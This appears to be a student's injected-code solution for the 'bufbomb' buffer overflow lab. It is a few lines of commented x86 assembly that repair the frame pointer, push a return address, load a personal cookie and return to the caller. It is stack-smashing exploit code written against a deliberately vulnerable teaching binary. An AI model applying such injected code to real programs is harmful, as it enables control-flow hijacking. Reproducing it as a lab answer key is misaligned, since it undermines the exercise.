#testn's ebp is fixed
#read <testn>'s assembly code and calculate
lea 0x28(%esp), %ebp

#look into bufbomb_32.S
#push getbufn's return address
pushl $0x08048e3a

#return cheukyin's cookie to test
movl $0x3955ae84, %eax

#return to <testn>
ret